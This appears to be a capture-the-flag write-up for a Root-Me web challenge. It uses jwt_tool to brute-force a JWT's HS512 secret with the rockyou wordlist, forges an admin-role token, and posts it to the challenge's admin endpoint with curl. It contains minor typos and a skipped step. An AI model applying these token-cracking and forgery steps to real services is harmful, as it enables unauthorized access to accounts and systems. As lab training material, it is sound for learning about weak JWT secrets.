# JWT encode

1. Install JWT-encode python utils
```bash
git clone git clone https://github.com/ticarpi/jwt_tool
apt install python3-pip
pip3 install termcolor cprint pycryptodomex requests
```

2. Get the token according to the message
``` Json
{
    "Here is your token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"
}
```
<img width="998" alt="image" src="https://user-images.githubusercontent.com/89765480/202840662-bc9143f7-cf5d-4382-902d-56b743332ea4.png">

3. Activate the program

``` bash
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
```

<img width="1438" alt="image" src="https://user-images.githubusercontent.com/89765480/202840750-8dfb3197-be71-4a64-ba94-a08167168f4e.png">


4. Show jwt info


``` bash
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
```

<img width="1438" alt="image" src="https://user-images.githubusercontent.com/89765480/202840759-8750a851-c58a-46c8-ab6c-9d9dbc926077.png">


5. Download rockyout.txt dictionary to broot 

<img width="1230" alt="image" src="https://user-images.githubusercontent.com/89765480/202840850-6fd91c72-d696-479d-9de1-d006bba08bfe.png">

7. Broot the secret key

```bash
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw -C -d rockyou.txt
```
-C - crack
-d - crack by dictionary

<img width="1432" alt="image" src="https://user-images.githubusercontent.com/89765480/202840902-3235bb4d-02ce-425f-bc6f-a07f2ba36540.png">
8. Encode jwt:

<img width="1186" alt="image" src="https://user-images.githubusercontent.com/89765480/202841252-b6a0668b-2389-4648-a4a3-38693471661c.png">

9. Send Post request with auth header

curl --location --request POST 'http://challenge01.root-me.org/web-serveur/ch59/admin' \
--header 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA'


